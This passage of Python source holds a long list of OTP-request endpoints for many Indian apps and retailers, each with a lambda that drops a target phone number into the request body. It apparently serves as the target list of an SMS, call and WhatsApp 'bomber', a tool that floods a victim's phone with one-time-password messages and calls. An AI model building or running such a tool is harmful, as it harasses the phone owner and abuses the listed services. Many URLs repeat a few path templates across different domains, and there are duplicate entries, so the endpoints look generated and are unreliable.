    {'name': 'Rapido Call', 'url': 'https://rapido.bike/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Doubtnut Call', 'url': 'https://doubtnut.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Meesho WhatsApp', 'url': 'https://meesho.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Zivame Call', 'url': 'https://zivame.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Paytm WhatsApp', 'url': 'https://paytm.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Gokwik Call', 'url': 'https://gokwik.co/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Oyorooms Call', 'url': 'https://oyorooms.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Doubtnut WhatsApp', 'url': 'https://doubtnut.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': '1Mg SMS', 'url': 'https://1mg.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Zepto Call', 'url': 'https://zepto.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Doubtnut Call', 'url': 'https://doubtnut.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Zepto SMS', 'url': 'https://zepto.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Amazon Call', 'url': 'https://amazon.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Phonepe WhatsApp', 'url': 'https://phonepe.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Doubtnut Call', 'url': 'https://doubtnut.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Ajio SMS', 'url': 'https://ajio.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Zomato Call', 'url': 'https://zomato.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Ajio SMS', 'url': 'https://ajio.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Pokerbaazi WhatsApp', 'url': 'https://pokerbaazi.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Nykaa SMS', 'url': 'https://nykaa.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Myntra Call', 'url': 'https://myntra.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Uber WhatsApp', 'url': 'https://uber.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Phonepe Call', 'url': 'https://phonepe.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Flipkart Call', 'url': 'https://flipkart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Instamart WhatsApp', 'url': 'https://instamart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Olacabs SMS', 'url': 'https://olacabs.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Zomato SMS', 'url': 'https://zomato.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Swiggy Call', 'url': 'https://swiggy.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Pokerbaazi Call', 'url': 'https://pokerbaazi.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': '1Mg WhatsApp', 'url': 'https://1mg.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Doubtnut SMS', 'url': 'https://doubtnut.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Phonepe Call', 'url': 'https://phonepe.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Zivame SMS', 'url': 'https://zivame.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Phonepe Call', 'url': 'https://phonepe.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Makemytrip Call', 'url': 'https://makemytrip.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Zivame SMS', 'url': 'https://zivame.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Newme Call', 'url': 'https://newme.asia/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Amazon SMS', 'url': 'https://amazon.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Newme SMS', 'url': 'https://newme.asia/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Meesho WhatsApp', 'url': 'https://meesho.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Zepto Call', 'url': 'https://zepto.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Makemytrip WhatsApp', 'url': 'https://makemytrip.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Instamart Call', 'url': 'https://instamart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Api-Gateway WhatsApp', 'url': 'https://api-gateway.juno.lenskart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Uber Call', 'url': 'https://uber.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Cred Call', 'url': 'https://cred.club/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Newme Call', 'url': 'https://newme.asia/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Gokwik SMS', 'url': 'https://gokwik.co/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Bigbasket Call', 'url': 'https://bigbasket.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Tatacapital SMS', 'url': 'https://tatacapital.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Zivame SMS', 'url': 'https://zivame.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Phonepe Call', 'url': 'https://phonepe.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Goibibo SMS', 'url': 'https://goibibo.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Tatacapital Call', 'url': 'https://tatacapital.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Myntra Call', 'url': 'https://myntra.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Olacabs WhatsApp', 'url': 'https://olacabs.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Doubtnut WhatsApp', 'url': 'https://doubtnut.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': '1Mg SMS', 'url': 'https://1mg.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Api-Gateway WhatsApp', 'url': 'https://api-gateway.juno.lenskart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Olacabs SMS', 'url': 'https://olacabs.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Uber SMS', 'url': 'https://uber.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Swiggy WhatsApp', 'url': 'https://swiggy.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Paytm SMS', 'url': 'https://paytm.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Meesho Call', 'url': 'https://meesho.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Api-Gateway SMS', 'url': 'https://api-gateway.juno.lenskart.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Pharmeasy Call', 'url': 'https://pharmeasy.in/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Uber WhatsApp', 'url': 'https://uber.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Wakefit SMS', 'url': 'https://wakefit.co/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Zomato WhatsApp', 'url': 'https://zomato.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Myntra WhatsApp', 'url': 'https://myntra.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Api-Gateway SMS', 'url': 'https://api-gateway.juno.lenskart.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Gokwik Call', 'url': 'https://gokwik.co/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Myntra SMS', 'url': 'https://myntra.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Zepto SMS', 'url': 'https://zepto.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Doubtnut SMS', 'url': 'https://doubtnut.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Phonepe Call', 'url': 'https://phonepe.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Tatacapital Call', 'url': 'https://tatacapital.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Shiprocket SMS', 'url': 'https://shiprocket.in/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Nykaa Call', 'url': 'https://nykaa.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Amazon SMS', 'url': 'https://amazon.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Doubtnut SMS', 'url': 'https://doubtnut.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Flipkart Call', 'url': 'https://flipkart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Bigbasket SMS', 'url': 'https://bigbasket.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Paytm Call', 'url': 'https://paytm.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Meesho SMS', 'url': 'https://meesho.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Dmart WhatsApp', 'url': 'https://dmart.ready.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Rapido SMS', 'url': 'https://rapido.bike/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Pokerbaazi WhatsApp', 'url': 'https://pokerbaazi.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Olacabs Call', 'url': 'https://olacabs.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Pharmeasy SMS', 'url': 'https://pharmeasy.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Wakefit Call', 'url': 'https://wakefit.co/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Phonepe Call', 'url': 'https://phonepe.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Goibibo Call', 'url': 'https://goibibo.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Meesho SMS', 'url': 'https://meesho.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Blinkit SMS', 'url': 'https://blinkit.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Api-Gateway Call', 'url': 'https://api-gateway.juno.lenskart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Goibibo Call', 'url': 'https://goibibo.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Makemytrip Call', 'url': 'https://makemytrip.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Dmart Call', 'url': 'https://dmart.ready.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Dmart WhatsApp', 'url': 'https://dmart.ready.in/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Goibibo SMS', 'url': 'https://goibibo.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Oyorooms WhatsApp', 'url': 'https://oyorooms.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Doubtnut SMS', 'url': 'https://doubtnut.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Blinkit SMS', 'url': 'https://blinkit.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Jupiter WhatsApp', 'url': 'https://jupiter.money/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Jupiter SMS', 'url': 'https://jupiter.money/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Api-Gateway WhatsApp', 'url': 'https://api-gateway.juno.lenskart.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Zomato SMS', 'url': 'https://zomato.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Instamart Call', 'url': 'https://instamart.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Amazon WhatsApp', 'url': 'https://amazon.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Shiprocket WhatsApp', 'url': 'https://shiprocket.in/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
